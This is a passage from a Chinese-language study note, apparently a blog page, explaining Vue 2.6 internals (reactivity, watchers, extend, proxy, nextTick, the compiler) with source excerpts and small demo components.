          dep<span>.</span><span>notify</span><span>(</span><span>)</span>
        <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

window<span>.</span>Dep <span>=</span> <span>class</span> <span>Dep</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>subscribers <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span>
  <span>}</span>

  <span>depend</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>activeUpdate<span>)</span> <span>{</span>
      <span>this</span><span>.</span>subscribers<span>.</span><span>add</span><span>(</span>activeUpdate<span>)</span>
    <span>}</span>
  <span>}</span>

  <span>notify</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>subscribers<span>.</span><span>forEach</span><span>(</span><span>subscriber</span> <span>=></span> <span>subscriber</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>let</span> activeUpdate

<span>// 作用：确保 update() 执行时，depend 可以访问到 activeUpdate</span>
<span>function</span> <span>autorun</span><span>(</span><span>update</span><span>)</span> <span>{</span>
  <span>// 作用：保证依赖项一直是最新的</span>
  <span>function</span> <span>wrappedUpdate</span><span>(</span><span>)</span> <span>{</span>
    activeUpdate <span>=</span> wrappedUpdate
    <span>update</span><span>(</span><span>)</span>
    activeUpdate <span>=</span> <span>null</span>
  <span>}</span>
  <span>wrappedUpdate</span><span>(</span><span>)</span>
<span>}</span>

<span>const</span> state <span>=</span> <span>{</span>
  <span>count</span><span>:</span> <span>0</span><span>,</span>
<span>}</span>

<span>observe</span><span>(</span>state<span>)</span>

<span>autorun</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>state<span>.</span>count<span>)</span>
<span>}</span><span>)</span>

state<span>.</span>count<span>++</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br></div></div></li>
</ul>
<h2 id="_2-watcher"> 2. Watcher</h2>
<ul>
<li>
<ol>
<li>computed：computed watcher 是一个 <code>lazy: true</code> 的 watcher，通过 dirty 控制是否重新计算 value。</li>
</ol>
<blockquote>
<p>实例化 Watcher 时 <code>this.dirty = this.lazy</code> 为 true；解析模板取值时 <code>dirty: true</code> 计算 value（evaluate），计算完后 <code>dirty: false</code>；之后取值直接返回 watcher.value，仅当依赖的 dep 变化触发 dep.notify 执行 watcher.update 后 <code>dirty: true</code>，取值时重新计算后 <code>dirty: false</code>。</p>
</blockquote>
<div><pre><code><span>// computed：getter</span>
<span>function</span> <span>createComputedGetter</span><span>(</span><span>key</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>computedGetter</span><span>(</span><span>)</span> <span>{</span>
    <span>// ...</span>
    <span>if</span> <span>(</span>watcher<span>)</span> <span>{</span>
      <span>// dirty 为 true 重新计算</span>
      <span>if</span> <span>(</span>watcher<span>.</span>dirty<span>)</span> <span>{</span>
        watcher<span>.</span><span>evaluate</span><span>(</span><span>)</span>
      <span>}</span>
      <span>// 收集依赖</span>
      <span>if</span> <span>(</span>Dep<span>.</span>target<span>)</span> <span>{</span>
        watcher<span>.</span><span>depend</span><span>(</span><span>)</span>
      <span>}</span>
      <span>return</span> watcher<span>.</span>value
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><div><pre><code><span>export</span> <span>default</span> <span>class</span> <span>Watcher</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>// ...</span>

    <span>// 实例化赋值 dirty</span>
    <span>this</span><span>.</span>dirty <span>=</span> <span>this</span><span>.</span>lazy
    <span>// ...</span>

    <span>// 计算属性实例化 Watcher 不会进行取值操作</span>
    <span>this</span><span>.</span>value <span>=</span> <span>this</span><span>.</span>lazy <span>?</span> <span>undefined</span> <span>:</span> <span>this</span><span>.</span><span>get</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// dep setter 触发 notify 执行 update</span>
  <span>update</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>lazy<span>)</span> <span>{</span>
      <span>// 取值后将 dirty 置为 true</span>
      <span>this</span><span>.</span>dirty <span>=</span> <span>true</span>
    <span>}</span> <span>// ...</span>
  <span>}</span>
  <span>// 计算值</span>
  <span>evaluate</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>value <span>=</span> <span>this</span><span>.</span><span>get</span><span>(</span><span>)</span>
    <span>// 计算完将 dirty 置为 false</span>
    <span>this</span><span>.</span>dirty <span>=</span> <span>false</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div></li>
<li>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/instance/state.js#L170-L257" target="_blank" rel="noopener noreferrer">src/core/instance/state</a></p>
</li>
<li>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/watcher.js" target="_blank" rel="noopener noreferrer">src/core/observer/watcher</a></p>
</li>
<li>
<ol start="2">
<li>watch &amp; $watch：user watcher 是用户自定义 watcher，会处理回调错误，可选择配置 deep 和 immediate。</li>
</ol>
<blockquote>
<ul>
<li>immediate：立即触发回调。</li>
<li>deep：深度监听对象（递归遍历方式收集依赖）。</li>
</ul>
</blockquote>
<div><pre><code><span>Vue</span><span>.</span>prototype<span>.</span><span>$watch</span> <span>=</span> <span>function</span> <span>(</span>
  <span><span>expOrFn</span><span>:</span> string <span>|</span> Function<span>,</span>
  <span>cb</span><span>:</span> any<span>,</span>
  options<span>?</span><span>:</span> Object</span>
<span>)</span><span>:</span> Function <span>{</span>
  <span>const</span> <span>vm</span><span>:</span> Component <span>=</span> <span>this</span>
  <span>if</span> <span>(</span><span>isPlainObject</span><span>(</span>cb<span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>createWatcher</span><span>(</span>vm<span>,</span> expOrFn<span>,</span> cb<span>,</span> options<span>)</span>
  <span>}</span>
  options <span>=</span> options <span>||</span> <span>{</span><span>}</span>
  options<span>.</span>user <span>=</span> <span>true</span>
  <span>const</span> watcher <span>=</span> <span>new</span> <span>Watcher</span><span>(</span>vm<span>,</span> expOrFn<span>,</span> cb<span>,</span> options<span>)</span>
  <span>if</span> <span>(</span>options<span>.</span>immediate<span>)</span> <span>{</span>
    <span>const</span> info <span>=</span> <span><span>`</span><span>callback for immediate watcher "</span><span><span>${</span>watcher<span>.</span>expression<span>}</span></span><span>"</span><span>`</span></span>
    <span>pushTarget</span><span>(</span><span>)</span>
    <span>// 立即触发回调</span>
    <span>invokeWithErrorHandling</span><span>(</span>cb<span>,</span> vm<span>,</span> <span>[</span>watcher<span>.</span>value<span>]</span><span>,</span> vm<span>,</span> info<span>)</span>
    <span>popTarget</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// 返回取消观察函数</span>
  <span>return</span> <span>function</span> <span>unwatchFn</span><span>(</span><span>)</span> <span>{</span>
    watcher<span>.</span><span>teardown</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><div><pre><code><span>export</span> <span>default</span> <span>class</span> <span>Watcher</span> <span>{</span>
  <span>get</span><span>(</span><span>)</span> <span>{</span>
    <span>// ...</span>
    <span>try</span> <span>{</span>
      <span>// ...</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      <span>// ...</span>
    <span>}</span> <span>finally</span> <span>{</span>
      <span>// 深度收集依赖</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>deep<span>)</span> <span>{</span>
        <span>traverse</span><span>(</span>value<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> value
  <span>}</span><span>,</span>
  <span>// 取消观察</span>
  <span>teardown</span> <span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>active<span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>vm<span>.</span>_isBeingDestroyed<span>)</span> <span>{</span>
        <span>remove</span><span>(</span><span>this</span><span>.</span>vm<span>.</span>_watchers<span>,</span> <span>this</span><span>)</span>
      <span>}</span>
      <span>let</span> i <span>=</span> <span>this</span><span>.</span>deps<span>.</span>length
      <span>while</span> <span>(</span>i<span>--</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>deps<span>[</span>i<span>]</span><span>.</span><span>removeSub</span><span>(</span><span>this</span><span>)</span>
      <span>}</span>
      <span>this</span><span>.</span>active <span>=</span> <span>false</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><div><pre><code><span>// 递归遍历收集依赖（seenObjects 处理循环依赖）</span>
<span>export</span> <span>function</span> <span>traverse</span><span>(</span><span><span>val</span><span>:</span> any</span><span>)</span> <span>{</span>
  <span>_traverse</span><span>(</span>val<span>,</span> seenObjects<span>)</span>
  seenObjects<span>.</span><span>clear</span><span>(</span><span>)</span>
<span>}</span>

<span>function</span> <span>_traverse</span><span>(</span><span><span>val</span><span>:</span> any<span>,</span> <span>seen</span><span>:</span> SimpleSet</span><span>)</span> <span>{</span>
  <span>let</span> i<span>,</span> keys
  <span>const</span> isA <span>=</span> Array<span>.</span><span>isArray</span><span>(</span>val<span>)</span>
  <span>if</span> <span>(</span>
    <span>(</span><span>!</span>isA <span>&amp;&amp;</span> <span>!</span><span>isObject</span><span>(</span>val<span>)</span><span>)</span> <span>||</span>
    Object<span>.</span><span>isFrozen</span><span>(</span>val<span>)</span> <span>||</span>
    val <span>instanceof</span> <span>VNode</span>
  <span>)</span> <span>{</span>
    <span>return</span>
  <span>}</span>
  <span>if</span> <span>(</span>val<span>.</span>__ob__<span>)</span> <span>{</span>
    <span>const</span> depId <span>=</span> val<span>.</span>__ob__<span>.</span>dep<span>.</span>id
    <span>if</span> <span>(</span>seen<span>.</span><span>has</span><span>(</span>depId<span>)</span><span>)</span> <span>{</span>
      <span>return</span>
    <span>}</span>
    seen<span>.</span><span>add</span><span>(</span>depId<span>)</span>
  <span>}</span>
  <span>if</span> <span>(</span>isA<span>)</span> <span>{</span>
    i <span>=</span> val<span>.</span>length
    <span>while</span> <span>(</span>i<span>--</span><span>)</span> <span>_traverse</span><span>(</span>val<span>[</span>i<span>]</span><span>,</span> seen<span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    keys <span>=</span> Object<span>.</span><span>keys</span><span>(</span>val<span>)</span>
    i <span>=</span> keys<span>.</span>length
    <span>while</span> <span>(</span>i<span>--</span><span>)</span> <span>_traverse</span><span>(</span>val<span>[</span>keys<span>[</span>i<span>]</span><span>]</span><span>,</span> seen<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div></li>
<li>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/instance/state.js#L293-L370" target="_blank" rel="noopener noreferrer">src/core/instance/state</a></p>
</li>
<li>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/traverse.js" target="_blank" rel="noopener noreferrer">src/core/observer/traverse</a></p>
</li>
<li>
<ol start="3">
<li>Vuex strict mode：sync watcher 是 Vuex 严格模式下的 watcher。不经过 nextTick 异步执行，可以保证所有的状态变更都能被调试工具跟踪到（<a href="https://vuex.vuejs.org/zh/guide/strict.html" target="_blank" rel="noopener noreferrer">严格模式 - Vuex</a>）。</li>
</ol>
<div><pre><code><span>export</span> <span>default</span> <span>class</span> <span>Watcher</span> <span>{</span>
  <span>update</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>lazy<span>)</span> <span>{</span>
      <span>// ...</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span>sync<span>)</span> <span>{</span>
      <span>// 同步执行 run</span>
      <span>this</span><span>.</span><span>run</span><span>(</span><span>)</span>
    <span>}</span> <span>// ...</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/watcher.js#L165-L174" target="_blank" rel="noopener noreferrer">src/core/observer/watcher</a></p>
</li>
<li>
<p><a href="https://github.com/vuejs/vuex/blob/v3.6.2/src/store.js#L518" target="_blank" rel="noopener noreferrer">Vuex - src/store</a></p>
</li>
</ul>
<h2 id="_3-extend"> 3. extend</h2>
<ul>
<li>Vue.extend 使用原型继承的方式构造一个 Vue 的子类 Sub，并对构造的 Sub 进行缓存处理。</li>
</ul>
<div><pre><code>Vue<span>.</span><span>extend</span> <span>=</span> <span>function</span> <span>(</span><span><span>extendOptions</span><span>:</span> Object</span><span>)</span><span>:</span> Function <span>{</span>
  <span>const</span> Super <span>=</span> <span>this</span>
  <span>const</span> SuperId <span>=</span> Super<span>.</span>cid
  <span>// ...</span>
  <span>if</span> <span>(</span>cachedCtors<span>[</span>SuperId<span>]</span><span>)</span> <span>{</span>
    <span>return</span> cachedCtors<span>[</span>SuperId<span>]</span>
  <span>}</span>
  <span>// ...</span>
  <span>const</span> <span>Sub</span> <span>=</span> <span>function</span> <span>VueComponent</span><span>(</span><span>options</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>_init</span><span>(</span>options<span>)</span>
  <span>}</span>
  <span>Sub</span><span>.</span>prototype <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>Super</span><span>.</span>prototype<span>)</span>
  <span>Sub</span><span>.</span>prototype<span>.</span>constructor <span>=</span> Sub
  <span>// ...</span>

  <span>// cache constructor</span>
  cachedCtors<span>[</span>SuperId<span>]</span> <span>=</span> Sub
  <span>return</span> Sub
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><ul>
<li><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/global-api/extend.js" target="_blank" rel="noopener noreferrer">src/core/global-api/extend.js </a></li>
</ul>
<h2 id="_4-proxy"> 4. proxy</h2>
<ul>
<li>proxy 的作用是把 props、data 等代理到实例上，使得可以通过 this 访问。</li>
</ul>
<div><pre><code><span>const</span> sharedPropertyDefinition <span>=</span> <span>{</span>
  <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>configurable</span><span>:</span> <span>true</span><span>,</span>
  <span>get</span><span>:</span> noop<span>,</span>
  <span>set</span><span>:</span> noop<span>,</span>
<span>}</span>

<span>export</span> <span>function</span> <span>proxy</span><span>(</span><span><span>target</span><span>:</span> Object<span>,</span> <span>sourceKey</span><span>:</span> string<span>,</span> <span>key</span><span>:</span> string</span><span>)</span> <span>{</span>
  sharedPropertyDefinition<span>.</span><span>get</span> <span>=</span> <span>function</span> <span>proxyGetter</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>[</span>sourceKey<span>]</span><span>[</span>key<span>]</span>
  <span>}</span>
  sharedPropertyDefinition<span>.</span><span>set</span> <span>=</span> <span>function</span> <span>proxySetter</span><span>(</span><span>val</span><span>)</span> <span>{</span>
    <span>this</span><span>[</span>sourceKey<span>]</span><span>[</span>key<span>]</span> <span>=</span> val
  <span>}</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> key<span>,</span> sharedPropertyDefinition<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>// 重置 data</span>
Object<span>.</span><span>assign</span><span>(</span><span>this</span><span>.</span>$data<span>,</span> <span>this</span><span>.</span>$options<span>.</span><span>data</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span><span>)</span>

<span>// 重置 data 上的 form 属性</span>
<span>this</span><span>.</span>form <span>=</span> <span>this</span><span>.</span>$options<span>.</span><span>data</span><span>.</span><span>call</span><span>(</span><span>this</span><span>)</span><span>.</span>form
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/instance/state.js#L32-L47" target="_blank" rel="noopener noreferrer">src/core/instance/state</a></li>
</ul>
<h2 id="_5-nexttick"> 5. nextTick</h2>
<ul>
<li>
<p>nextTick 在异步任务中遍历 callbacks 执行回调函数，采用的异步任务优先级：Promise -&gt; MutationObserver -&gt; setImmediate（IE 与 Node） -&gt; setTimeout。</p>
</li>
<li>
<p>使用 callbacks 而不是在 nextTick 直接执行回调函数，可以保证在同一个 tick 内多次执行 nextTick 不会开启多个异步任务。</p>
</li>
<li>
<p>若 nextTick 没有传入回调函数，那么会返回一个 Promise。</p>
</li>
</ul>
<div><pre><code><span>export</span> <span>function</span> <span>nextTick</span><span>(</span><span>cb<span>?</span><span>:</span> Function<span>,</span> ctx<span>?</span><span>:</span> Object</span><span>)</span> <span>{</span>
  <span>let</span> _resolve
  callbacks<span>.</span><span>push</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>cb<span>)</span> <span>{</span>
      <span>try</span> <span>{</span>
        <span>cb</span><span>.</span><span>call</span><span>(</span>ctx<span>)</span>
      <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
        <span>handleError</span><span>(</span>e<span>,</span> ctx<span>,</span> <span>'nextTick'</span><span>)</span>
      <span>}</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>_resolve<span>)</span> <span>{</span>
      <span>_resolve</span><span>(</span>ctx<span>)</span>
    <span>}</span>
  <span>}</span><span>)</span>
  <span>if</span> <span>(</span><span>!</span>pending<span>)</span> <span>{</span>
    pending <span>=</span> <span>true</span>
    <span>timerFunc</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// $flow-disable-line</span>
  <span>if</span> <span>(</span><span>!</span>cb <span>&amp;&amp;</span> <span>typeof</span> Promise <span>!==</span> <span>'undefined'</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>{</span>
      _resolve <span>=</span> resolve
    <span>}</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>div<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>onClick<span>"</span></span><span>></span></span>{{ papa }}<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>papa</span><span>:</span> <span>'jack'</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>onClick</span><span>(</span><span>)</span> <span>{</span>
      <span>// 异步：在组件 RenderWatcher 之后执行，视图已更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'promise'</span><span>)</span> <span>// pony</span>
      <span>}</span><span>)</span>

      <span>// 在组件 RenderWatcher 之前执行，视图尚未更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'papa before'</span><span>)</span> <span>// jack</span>
      <span>}</span><span>)</span>

      <span>// queue 添加 RenderWatcher</span>
      <span>this</span><span>.</span>papa <span>=</span> <span>'pony'</span>

      <span>// 在组件 RenderWatcher 之后执行，视图已更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'papa after'</span><span>)</span> <span>// pony</span>
      <span>}</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>div<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>onClick<span>"</span></span><span>></span></span>{{ papa }}<span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span><span>></span></span>{{ assets }}<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>papa</span><span>:</span> <span>'jack'</span><span>,</span>
      <span>assets</span><span>:</span> <span>777</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>onClick</span><span>(</span><span>)</span> <span>{</span>
      <span>// 异步：在组件 RenderWatcher 之后执行，视图已更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'promise'</span><span>)</span> <span>// pony</span>
      <span>}</span><span>)</span>

      <span>// queue 添加 RenderWatcher</span>
      <span>this</span><span>.</span>assets <span>=</span> <span>888</span>

      <span>// 在组件 RenderWatcher 之后执行，视图已更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'papa before'</span><span>)</span> <span>// pony</span>
      <span>}</span><span>)</span>

      <span>// RenderWatcher 已在 queue 队列中，这里不会再次添加 RenderWatcher</span>
      <span>// https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/scheduler.js#L165-L167</span>
      <span>this</span><span>.</span>papa <span>=</span> <span>'pony'</span>

      <span>// 在组件 RenderWatcher 之后执行，视图已更新</span>
      <span>this</span><span>.</span><span>$nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span>div<span>.</span>innerHTML<span>,</span> <span>'papa after'</span><span>)</span> <span>// pony</span>
      <span>}</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div><ul>
<li><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/util/next-tick.js" target="_blank" rel="noopener noreferrer">src/core/util/next-tick</a></li>
</ul>
<h2 id="_6-compiler"> 6. compiler</h2>
<img :src="$withBase('/images/Vue/Vue-compiler.png')" loading="lazy">
<div><pre><code><span>export</span> <span>const</span> createCompiler <span>=</span> <span>createCompilerCreator</span><span>(</span><span>function</span> <span>baseCompile</span><span>(</span>
  <span><span>template</span><span>:</span> string<span>,</span>
  <span>options</span><span>:</span> CompilerOptions</span>
<span>)</span><span>:</span> CompiledResult <span>{</span>
  <span>// 解析 template 生成 ast</span>
  <span>const</span> ast <span>=</span> <span>parse</span><span>(</span>template<span>.</span><span>trim</span><span>(</span><span>)</span><span>,</span> options<span>)</span>
  <span>if</span> <span>(</span>options<span>.</span>optimize <span>!==</span> <span>false</span><span>)</span> <span>{</span>
    <span>// 优化 ast</span>
    <span>optimize</span><span>(</span>ast<span>,</span> options<span>)</span>
  <span>}</span>
  <span>// 生成可执行代码</span>
  <span>const</span> code <span>=</span> <span>generate</span><span>(</span>ast<span>,</span> options<span>)</span>
  <span>return</span> <span>{</span>
    ast<span>,</span>
    <span>render</span><span>:</span> code<span>.</span>render<span>,</span>
    <span>staticRenderFns</span><span>:</span> code<span>.</span>staticRenderFns<span>,</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre>
